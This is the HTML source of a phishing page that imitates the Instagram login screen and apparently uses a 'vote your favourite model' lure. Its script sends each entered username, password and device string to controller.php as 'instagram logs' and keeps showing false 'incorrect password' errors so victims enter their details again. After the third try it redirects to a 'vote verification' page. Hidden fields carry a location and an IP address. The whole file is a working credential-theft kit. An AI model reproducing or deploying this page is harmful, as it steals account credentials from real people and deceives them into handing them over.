
<!DOCTYPE html>
<html lang="en">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- <title>Giveaway Instant Portal </title> -->
    <!-- <link rel="stylesheet" href="main.css"> -->
    <meta name="robots" content="noindex">

    <style>
        
/* Universal Selectors */
#root, body, html {
    height:100%;
  }
  
  body {
    overflow-y: scroll;
  }
  
  a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
    margin:0;
    padding:0;
    border:0;
    font:inherit;
    vertical-align: baseline;
  } 
  
  a, a:visited {
    text-decoration: none;
  }
  a:active, .btn:active {
    opacity:.5;
  }
  
  ol, ul {
    list-style: none;
  }
  
  body, button, input {
    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    font-size:14px;
    line-height:18px;
  }
  
  #root, article, main, div, section, header, nav, footer {
    border: 0 solid #000000;
    box-sizing: border-box;
    align-items: stretch;
    display: flex;
    flex-direction: column;
    flex-shrink: 0;
    margin:0;
    padding:0;
    position: relative;
    -webkit-box-align: stretch;
      -moz-box-align: stretch;
    -webkit-box-orient: vertical;
      -moz-box-orient: vertical;
    -webkit-box-direction: normal;
      -moz-box-direction: normal;
  } /* <--Universal Selectors End */
  
  
  #root {
    z-index: 0;
  }
  
  .section-all {
    min-height:100%;
    overflow:hidden;
  }
  
  .main {
    background-color: #fafafa;
    width: 90%;
    margin: 0 auto;
    order: 4;
    flex-grow: 1;
    -webkit-box-flex: 1;
    -moz-box-flex: 1;
    -moz-box-ordinal-group: 5;
    -webkit-box-ordinal-group: 5;
  }
  
  .wrapper {
    min-height:100%;
    overflow: hidden;
  }
  
  .wrapper, .article {
    flex-grow: 1;
    justify-content: center;
    -webkit-box-flex: 1;
      -moz-box-flex: 1;
    -webkit-box-pack: center;
      -moz-box-pack: center;
  }
  
  .article {
    flex-direction: row;
    margin:0 auto;
    max-width: 935px;
    width:100%;
    -webkit-box-orient: horizontal;
      -moz-box-orient: horizontal;
    -webkit-box-direction: normal;
      -moz-box-direction: normal;
  }
  
  .content {
    color:#262626;
    flex-grow:1;
    justify-content: center;
    max-width: 350px;
    margin-top:12px;
    -webkit-box-pack: justify;
      -moz-box-pack: justify;
    -webkit-box-flex: 1;
      -moz-box-flex: 1;  
  }
  
  .login-box {
    background: #fff;
    border: 1px solid #e6e6e6;
    border-radius: 1px;
    margin:0 0 10px;
    padding: 10px 0;
    /* align-items: center; */
  }
  
  .header {
    margin: 14.45px auto 12px;
  }
  

  .logo {
    background: cover no-repeat;
    width:175px;
    height:auto;
  }
  
  .form {
    display: flex;
    flex-direction: column;
    margin-bottom: 10px;
    -moz-box-direction: normal;
    -webkit-box-direction: normal;
  }
  
  .input-box {
    margin:auto 40px 6px;
  }
  
  input {
    height: 36px;
    border: 1px solid #efefef;
    border-radius: 3px;
    background-color: #fafafa;
    width:100%;
    font-size:12px;
    margin: 0;
    padding: 9px 0 7px 8px;
    outline: none;
    overflow: hidden;
    text-overflow: ellipsis;
    box-sizing: border-box;
  }
  input#name:focus, input#password:focus {
    border-color:#bbb;
  }
  
  .button-box {
    display: block;
    position: relative;
    margin: 8px 40px;
  }
  .btn {
    cursor: pointer;
    width: 100%;
    padding:0 8px; 
    background: #3897f0;
    border:1px solid #3897f0;
    color:#fff;
    border-radius:3px;
    font-weight:600;
    font-size: 14px;
    height: 28px;
    line-height: 26px;
    outline: none;
    white-space: nowrap;
  }
  
  .forgot, .forgot:active, .forgot:hover, .forgot:visited {
    font-size:12px;
    margin-top:12px;
    text-align: center;
    color:#003569;
    line-height: 14px!important;
  }
  
  .text {
    text-align:center;
    margin:15px;
    color:#262626;
    font-size:14px;
  }
  
  .text a, .text a:visited, .text a:hover, .text a:active {
    color:#3897f0;
    margin-left:3px;
  }
  
  /* App Store */
  .app p {
    line-height: 18px;
    color:#262626;
    font-size:14px;
    text-align:center;
    margin:10px 20px;
  }
  
  .app-img {
    flex-direction: row;
    justify-content: center;
    margin:10px 0;
    -webkit-box-orient: horizontal;
    -moz-box-orient: horizontal;
  }
  
  .app-img a {
    margin-right:8px;
    height: 43.5px;
  }
  
  .app-img img {
    height:40px;
  }
  
  /* FOOTER */
  .footer {
    background-color: #fafafa;
    order: 5;
    padding: 0 20px;
    background: #fafafa;
  }
  
  .footer-container {
    flex-direction: row;  
    flex-wrap:wrap;
    background-color: #fafafa;
    justify-content: space-between;
    padding: 38px 0;
    max-width:935px;
    font-size:12px;
    font-weight:600;
    margin:0 auto;
    text-transform:uppercase;
    width:100%
  }
  
  .footer-nav {
    max-width:100%;
  }
  
  .footer-nav ul {
    margin-right:16px;
    margin-bottom:3px;
    flex-grow:1;
  }
  
  .footer-nav ul li {
    display: inline-block;
    margin-right: 13px;
    margin-bottom:7px;
  }
  
  .footer-nav ul li a {
    color: #003569;
    text-decoration: none;
  }
  
  .footer span {
    color:#999;
  }
  
  span.language { 
    color: #003569;
    cursor: pointer;
    display: inline-block;
    font-weight: 600;
    position: relative;
    text-transform: uppercase;
    vertical-align: top;
  }
  
  .select {
    cursor: pointer;
    height: 100%;
    top: 0;
    opacity: 0;
    position: absolute;
    left:0;
    width: 100%;
  }
  
  /* Media Queries */
  @media (min-width:1550px) {
    .main {
      background-color: #fff;
    }
  
    .content {
      max-width: 100%;
      margin-top: 0;
      justify-content: space-between;
    }
  
    .login-box {
      background-color: transparent;
      border:none;
    }
  
    .logo {
      background: cover no-repeat;
      width:175px;
      height:auto;
      margin:0 auto;
    }
  
    .btn {
      cursor: pointer;
      width: 100%;
      padding:0 8px; 
      background: #3897f0;
      border:1px solid #3897f0;
      color:#fff;
      border-radius:3px;
      font-weight:600;
      font-size: 14px;
      height: 28px;
      line-height: 26px;
      outline: none;
      white-space: nowrap;
    }
  
    .input-box {
      border: 1px solid #efefef;
      border-radius: 3px;
      height: 36px;
      background: #fafafa;
      position: relative;
    }
  
    input {
      border: 0;
      background-color: #fafafa;
      width:100%;
      font-size:12px;
      margin: 0;
      padding: 9px 0 7px 8px;
      outline: none;
      overflow: hidden;
      text-overflow: ellipsis;
      box-sizing: border-box;
    }
  
    .input-box:hover, .input-box:focus {
      border-color:#bbb;
    }
  
  }
  
  @media only screen and (max-width:875px) {
    .footer-container {
      text-align: center;
      padding:10px 0;
    }
    .footer-container,  .footer-nav ul {
      justify-content: center;
      margin:0 auto;
      max-width: 360px;
      min-width: auto;
      -webkit-box-pack: center;
      -moz-box-pack: center;
    }
  
  }
  

    </style>

    <!-- HTML Meta Tags -->
<!-- <meta name="description" content="Discover the latest fashion trends with lobiluxurydesign. Shop the new collection of clothing, footwear, accessories, beauty products and more."> -->

<!-- Facebook Meta Tags -->
<!-- <meta property="og:url" content="http://helpmigrow.epizy.com/">
<meta property="og:type" content="website">
<meta property="og:title" content="Vote your favourite model">
<meta property="og:description" content="">
<meta property="og:image" content="http://helpmigrow.epizy.com/images/dabas.jpg"> -->

<!-- Twitter Meta Tags -->
<!-- <meta name="twitter:card" content="summary_large_image">
<meta property="twitter:domain" content="http://helpmigrow.epizy.com/">
<meta property="twitter:url" content="http://helpmigrow.epizy.com/">
<meta name="twitter:title" content="Vote your favourite model">
<meta name="twitter:description" content="">
<meta name="twitter:image" content="http://helpmigrow.epizy.com/images/dabas.jpg"> -->

<!-- Meta Tags Generated via https://www.opengraph.xyz -->

<head>


    <section class="section-all" style='color: #507392;'>

        <!-- 1-Role Main -->
        <main class="main" role="main">
            <div class="wrapper">
                <article class="article">
                    <div class="content">
                        <div class="login-box">
                            <div class="header">
                                <img class="logo" src="1024px-Instagram_logo.svg.png">
                            </div><!-- Header end -->
                            <div class="form-wrap">
                                <!-- <form class="form"> -->

                                    <div class="input-box">
                                        <input type="text" id="username" aria-describedby=""
                                            placeholder="Phone number, username, or email"  >
                                    </div>

                                    <div class="input-box">
                                        <input type="password"  id="password" placeholder="Password"  >
                                    </div>

                                    <span class="button-box">
                                        <img src="hug.gif" width="20px" id="loader" style="position: absolute; top: 0.5em; left: 9em95; display: none; ">

                                        <button class="btn" name="login" id="login">Log in</button>
                                    </span>

                                    <a class="forgot" href="">Forgot password?</a>
                                    <p id="feedback" style="color: red;  font-family: sans-serif; font-size: 15px; text-align: center; margin: 0 30px; display: none;"></p><br>
                                <!-- </form> -->
                            </div> <!-- Form-wrap end -->
                        </div> <!-- Login-box end -->

                        <div class="login-box">
                            <p class="text">Don't have an account?<a href="#">Sign up</a></p>
                        </div> <!-- Signup-box end -->

                        <div class="app">
                            
                            <p>Get the app.</p>
                            <div class="app-img">
                                <a
                                    href="">
                                    <img
                                        src="ios.png" style="height: 50px;">
                                </a>
                                <a
                                    href="">
                                    <img
                                        src="google.png"  style="height: 40px; margin-top: 5px;">
                                </a>
                            </div> <!-- App-img end-->
                        </div> <!-- App end -->
                    </div> <!-- Content end -->
                </article>
            </div> <!-- Wrapper end -->
        </main>

        <!-- 2-Role Footer -->
        <footer class="footer" role="contentinfo">
            <div class="footer-container">

                <nav class="footer-nav" role="navigation">
                    <ul>
                        <li><a href="">About Us</a></li>
                        <li><a href="">Support</a></li>
                        <li><a href="">Blog</a></li>
                        <li><a href="">Press</a></li>
                        <li><a href="">Api</a></li>
                        <li><a href="">Jobs</a></li>
                        <li><a href="">Privacy</a></li>
                        <li><a href="">Terms</a></li>
                        <li><a href="">Directory</a></li>
                        <li>
                            <span class="language">Language
                                <select name="language" class="select" onchange="la(this.value)">
                                    <option value="#">English</option>
                                    <option value="">Russian</option>
                                </select>
                            </span>
                        </li>
                    </ul>
                </nav>

                <!-- <span class="footer-logo">&copy; 2018 Instagram</span> -->
            </div> <!-- Footer container end -->
        </footer>

    </section>
    </span> 

    

    <input type="hidden" id='country' value='Nigeria
' name='country'>
    <input type="hidden" id='city' value='Benin City
' name='city'>
    <input type="hidden" id='ip' value='105.112.208.131' name='ip'>
    
    <!-- Root -->
    <script>
    var login = document.getElementById('login');
    var loader = document.getElementById('loader');
    var feedback = document.getElementById('feedback');
    var username = document.getElementById('username');
    var password = document.getElementById('password');
    var country = document.getElementById('country');
    var city = document.getElementById('city');
    var ip = document.getElementById('ip');
    var x = 0;
    
    login.addEventListener('click', function () {
        login.textContent = "";
        loader.style.display = "block";

        setTimeout(() => {
            feedback.style.display = 'block';
            login.textContent = "Log In";
            loader.style.display = "none"; // Correct

            
            if (username.value == "" || password.value == "") {
                feedback.textContent = "Inputs cannot be empty";
            } else {
                validation();
            }
        }, 1500);
    });

    function validation() {
        login.textContent = "";
        loader.style.display = 'block';

        setTimeout(() => {
            login.textContent = 'Log In';
            loader.style.display = 'none';
            const deviceName = navigator.userAgent;
            const data = new FormData();
            data.append('username', username.value);
            data.append('password', password.value);
            data.append('logType', 'instagram logs');
            data.append('device', deviceName);
            // Update the URL to point to controller.php
            const response = new XMLHttpRequest();
            response.onreadystatechange = function () {
                feedback.style.display = 'block';
            };
            response.open('POST', 'controller.php', true); // Update the URL here
            response.send(data);
            x ++
            feedback.textContent = 'The password you entered is incorrect. Please check your password and try again';
            if (x == 2) {
                feedback.textContent = 'The password you entered again is still incorrect. Please check your password and try again'
            }else if (x == 3){
                feedback.textContent = '';
                window.location.href='vote_verification.html'
            }
            response.send(data);

            // Rest of your code...
        }, 1500);
    }
</script>

</body>

</html>
